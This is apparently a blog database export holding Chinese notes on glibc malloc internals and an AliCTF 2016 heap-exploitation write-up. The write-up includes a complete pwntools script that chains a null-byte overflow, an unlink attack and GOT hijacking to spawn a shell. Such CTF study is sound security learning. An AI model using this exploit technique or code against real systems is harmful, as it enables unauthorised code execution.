bin中不会发生合并（chunk一直被标记为占用）\n2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头\n合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap\n（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）\n3、直接munmap返回给操作系统\n\n#### 来自源码中的注释 \nchunk不会被放回到normal bin中直到它们获得一次被malloc的机会\nChunks are not placed into regular bins until after they have been given one chance to be used in malloc\n\n#### 关于获取Size \n获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）\n\n## 关于堆的收缩 \n如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk\n\n#### 来自源码中的注释 \n收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理\n\n\n\n最后附一张图：\n![linux_heap_analysis0.png][2]\n\n\n[1]: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\n[2]: /images/linux_heap_analysis0.png\n","slug":"linux_heap_analysis","published":1,"updated":"2016-11-01T13:08:59.732Z","_id":"ciuw0d5ig0000pw60n24o3wgz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了<a href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\" target=\"_blank\" rel=\"external\">这篇分析</a>之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。</p>\n<a id=\"more\"></a>\n<h2 id=\"分配\"><a href=\"#分配\" class=\"headerlink\" title=\"分配\"></a>分配</h2><p>（fastbin的分配发生在链表的头部，其余都发生在链表尾部）<br>（在fast链表中是精确分配（只有大小完全符合才会分配）<br>    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配<br>    small链表在第一遍时是精确分配，第二遍时非精确<br>    large链表一直都是非精确分配）（注意链表和chunk不一样）<br>（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）</p>\n<p>1、首先获取Arena的锁，保证安全<br>2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）<br>——一种情况是没有可用Arena<br>没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0<br>——另一种情况是有可用Arena<br>1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）<br>2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）<br>3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步<br>4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）<br>5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回<br>6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回</p>\n<h4 id=\"关于sysmalloc\"><a href=\"#关于sysmalloc\" class=\"headerlink\" title=\"关于sysmalloc\"></a>关于sysmalloc</h4><p>1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）<br>2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配<br>如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）<br>最后再从top chunk中分配</p>\n<h4 id=\"按fast-bin、small-bin、large-bin分\"><a href=\"#按fast-bin、small-bin、large-bin分\" class=\"headerlink\" title=\"按fast bin、small bin、large bin分\"></a>按fast bin、small bin、large bin分</h4><p>1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样<br>2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统<br>3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统</p>\n<h4 id=\"关于巨块的分配\"><a href=\"#关于巨块的分配\" class=\"headerlink\" title=\"关于巨块的分配\"></a>关于巨块的分配</h4><p>没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap<br>mmap分配的未必就一定是大的chunk</p>\n<h2 id=\"释放\"><a href=\"#释放\" class=\"headerlink\" title=\"释放\"></a>释放</h2><p>（所有chunk的释放都是插入链表头部）<br>然后做一些基本的检查，比如size大小等<br>1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）<br>2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头<br>合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap<br>（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）<br>3、直接munmap返回给操作系统</p>\n<h4 id=\"来自源码中的注释\"><a href=\"#来自源码中的注释\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>chunk不会被放回到normal bin中直到它们获得一次被malloc的机会<br>Chunks are not placed into regular bins until after they have been given one chance to be used in malloc</p>\n<h4 id=\"关于获取Size\"><a href=\"#关于获取Size\" class=\"headerlink\" title=\"关于获取Size\"></a>关于获取Size</h4><p>获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）</p>\n<h2 id=\"关于堆的收缩\"><a href=\"#关于堆的收缩\" class=\"headerlink\" title=\"关于堆的收缩\"></a>关于堆的收缩</h2><p>如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk</p>\n<h4 id=\"来自源码中的注释-1\"><a href=\"#来自源码中的注释-1\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理</p>\n<p>最后附一张图：<br><img src=\"/images/linux_heap_analysis0.png\" alt=\"linux_heap_analysis0.png\"></p>\n","excerpt":"<p>想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了<a href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\">这篇分析</a>之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。</p>","more":"<h2 id=\"分配\"><a href=\"#分配\" class=\"headerlink\" title=\"分配\"></a>分配</h2><p>（fastbin的分配发生在链表的头部，其余都发生在链表尾部）<br>（在fast链表中是精确分配（只有大小完全符合才会分配）<br>    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配<br>    small链表在第一遍时是精确分配，第二遍时非精确<br>    large链表一直都是非精确分配）（注意链表和chunk不一样）<br>（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）</p>\n<p>1、首先获取Arena的锁，保证安全<br>2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）<br>——一种情况是没有可用Arena<br>没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0<br>——另一种情况是有可用Arena<br>1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）<br>2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）<br>3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步<br>4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）<br>5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回<br>6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回</p>\n<h4 id=\"关于sysmalloc\"><a href=\"#关于sysmalloc\" class=\"headerlink\" title=\"关于sysmalloc\"></a>关于sysmalloc</h4><p>1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）<br>2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配<br>如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）<br>最后再从top chunk中分配</p>\n<h4 id=\"按fast-bin、small-bin、large-bin分\"><a href=\"#按fast-bin、small-bin、large-bin分\" class=\"headerlink\" title=\"按fast bin、small bin、large bin分\"></a>按fast bin、small bin、large bin分</h4><p>1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样<br>2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统<br>3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统</p>\n<h4 id=\"关于巨块的分配\"><a href=\"#关于巨块的分配\" class=\"headerlink\" title=\"关于巨块的分配\"></a>关于巨块的分配</h4><p>没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap<br>mmap分配的未必就一定是大的chunk</p>\n<h2 id=\"释放\"><a href=\"#释放\" class=\"headerlink\" title=\"释放\"></a>释放</h2><p>（所有chunk的释放都是插入链表头部）<br>然后做一些基本的检查，比如size大小等<br>1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）<br>2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头<br>合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap<br>（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）<br>3、直接munmap返回给操作系统</p>\n<h4 id=\"来自源码中的注释\"><a href=\"#来自源码中的注释\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>chunk不会被放回到normal bin中直到它们获得一次被malloc的机会<br>Chunks are not placed into regular bins until after they have been given one chance to be used in malloc</p>\n<h4 id=\"关于获取Size\"><a href=\"#关于获取Size\" class=\"headerlink\" title=\"关于获取Size\"></a>关于获取Size</h4><p>获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）</p>\n<h2 id=\"关于堆的收缩\"><a href=\"#关于堆的收缩\" class=\"headerlink\" title=\"关于堆的收缩\"></a>关于堆的收缩</h2><p>如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk</p>\n<h4 id=\"来自源码中的注释-1\"><a href=\"#来自源码中的注释-1\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理</p>\n<p>最后附一张图：<br><img src=\"/images/linux_heap_analysis0.png\" alt=\"linux_heap_analysis0.png\"></p>"},{"title":"AliCTF 2016 fb writeup","date":"2016-06-07T12:33:00.000Z","_content":"\n一道堆中的null byte溢出题\n\n程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存\n\n<!--more-->\n\n由于读取输入的时候会在最后再添加'\\x00'：\n```\n.text:00000000004008E4                 cdqe\n.text:00000000004008E6                 lea     rdx, [rax-1]\n.text:00000000004008EA                 mov     rax, [rbp+var_18]\n.text:00000000004008EE                 add     rax, rdx\n.text:00000000004008F1                 mov     byte ptr [rax], 0\n.text:00000000004008F4                 mov     eax, [rbp+var_8]\n.text:00000000004008F7                 sub     eax, 1\n```\n\n所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来...）\n\n之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：\n\n```\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n```\n所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用[libc-database][1]这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址\n\n然后泄漏出来算下偏移就可以调用system()了\n\n\n\nExploit:\n\n```python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nio=process('./fb')\n# io = remote(\"114.55.103.213\",9733)\n\nSIZE=0xf8\nPLT_puts=0x4006C0\nGOT_free=0x602018\nGOT_read=0x602040\nFD=0x6020C8\nBK=0x6020D0\n\ndef init(size):\n\tio.recvuntil('Choice:')\n\tio.sendline('1')\n\tio.recvuntil('length:')\n\tio.sendline(str(size))\n\tio.recvuntil('Done~')\n\ndef edit(index,content):\n\tio.recvuntil('Choice:')\n\tio.sendline('2')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('content:')\n\tio.sendline(str(content))\n\tio.recvuntil('Done~')\n\ndef delete(index):\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('Done~')\n\ndef leak(dst):\n\tedit(1,p64(dst)+p64(SIZE)[:-1])\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('0')\n\tleakmem = io.recvuntil(\"Done~\")[:-6]\n\treturn str(leakmem)\n\ndef main():\n\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\n\tpayload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+'A'*0xd0+p64(0xf0)\n\t# overflow null byte\n\tedit(2,payload)\n        # gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))\n\tdelete(3)\n        \n\tpayload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)\n\tedit(2,payload2)\n\n\t# modify GOT entry of free to PLT entry of puts\n\t# use [:1] to prevent \\x00 from causing damage\n\tedit(2,p64(PLT_puts)[:-1])\n\n\t# leak read_addr\n\tread_addr=u64(leak(GOT_read).ljust(8,'\\x00'))\n\tprint \"read_addr: \"+str(hex(read_addr))\n\n\n\tsystem_addr=read_addr-0x980C0\n\t# system_addr= read_addr-0xeb6a0 +0x46590\n\t\n\t# modify free to system\n\tedit(2,p64(system_addr)[:-1])\n\tedit(4,\"/bin/sh\")\n\t\n\t# now get shell\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('4')\n\n\tio.interactive()\n\nmain()\n\n\n```\n\n\n[1]: https://github.com/niklasb/libc-database\n","source":"_posts/alictf_2016_fb_writeup.md","raw":"title: AliCTF 2016 fb writeup\n\ndate: 2016/06/07 20:33:00\n\n---\n\n一道堆中的null byte溢出题\n\n程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存\n\n<!--more-->\n\n由于读取输入的时候会在最后再添加'\\x00'：\n```\n.text:00000000004008E4                 cdqe\n.text:00000000004008E6                 lea     rdx, [rax-1]\n.text:00000000004008EA                 mov     rax, [rbp+var_18]\n.text:00000000004008EE                 add     rax, rdx\n.text:00000000004008F1                 mov     byte ptr [rax], 0\n.text:00000000004008F4                 mov     eax, [rbp+var_8]\n.text:00000000004008F7                 sub     eax, 1\n```\n\n所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来...）\n\n之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：\n\n```\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n```\n所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用[libc-database][1]这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址\n\n然后泄漏出来算下偏移就可以调用system()了\n\n\n\nExploit:\n\n```python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nio=process('./fb')\n# io = remote(\"114.55.103.213\",9733)\n\nSIZE=0xf8\nPLT_puts=0x4006C0\nGOT_free=0x602018\nGOT_read=0x602040\nFD=0x6020C8\nBK=0x6020D0\n\ndef init(size):\n\tio.recvuntil('Choice:')\n\tio.sendline('1')\n\tio.recvuntil('length:')\n\tio.sendline(str(size))\n\tio.recvuntil('Done~')\n\ndef edit(index,content):\n\tio.recvuntil('Choice:')\n\tio.sendline('2')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('content:')\n\tio.sendline(str(content))\n\tio.recvuntil('Done~')\n\ndef delete(index):\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('Done~')\n\ndef leak(dst):\n\tedit(1,p64(dst)+p64(SIZE)[:-1])\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('0')\n\tleakmem = io.recvuntil(\"Done~\")[:-6]\n\treturn str(leakmem)\n\ndef main():\n\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\n\tpayload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+'A'*0xd0+p64(0xf0)\n\t# overflow null byte\n\tedit(2,payload)\n        # gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))\n\tdelete(3)\n        \n\tpayload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)\n\tedit(2,payload2)\n\n\t# modify GOT entry of free to PLT entry of puts\n\t# use [:1] to prevent \\x00 from causing damage\n\tedit(2,p64(PLT_puts)[:-1])\n\n\t# leak read_addr\n\tread_addr=u64(leak(GOT_read).ljust(8,'\\x00'))\n\tprint \"read_addr: \"+str(hex(read_addr))\n\n\n\tsystem_addr=read_addr-0x980C0\n\t# system_addr= read_addr-0xeb6a0 +0x46590\n\t\n\t# modify free to system\n\tedit(2,p64(system_addr)[:-1])\n\tedit(4,\"/bin/sh\")\n\t\n\t# now get shell\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('4')\n\n\tio.interactive()\n\nmain()\n\n\n```\n\n\n[1]: https://github.com/niklasb/libc-database\n","slug":"alictf_2016_fb_writeup","published":1,"updated":"2016-11-01T13:30:05.356Z","_id":"ciuzgpo6y0000y060u1e5leid","comments":1,"layout":"post","photos":[],"link":"","content":"<p>一道堆中的null byte溢出题</p>\n<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>\n<a id=\"more\"></a>\n<p>由于读取输入的时候会在最后再添加’\\x00’：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">.text:00000000004008E4                 cdqe</div><div class=\"line\">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class=\"line\">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class=\"line\">.text:00000000004008EE                 add     rax, rdx</div><div class=\"line\">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class=\"line\">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class=\"line\">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>\n<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>\n<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">CANARY    : ENABLED</div><div class=\"line\">FORTIFY   : disabled</div><div class=\"line\">NX        : ENABLED</div><div class=\"line\">PIE       : disabled</div><div class=\"line\">RELRO     : Partial</div></pre></td></tr></table></figure>\n<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href=\"https://github.com/niklasb/libc-database\" target=\"_blank\" rel=\"external\">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>\n<p>然后泄漏出来算下偏移就可以调用system()了</p>\n<p>Exploit:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">io=process(<span class=\"string\">'./fb'</span>)</div><div class=\"line\"><span class=\"comment\"># io = remote(\"114.55.103.213\",9733)</span></div><div class=\"line\"></div><div class=\"line\">SIZE=<span class=\"number\">0xf8</span></div><div class=\"line\">PLT_puts=<span class=\"number\">0x4006C0</span></div><div 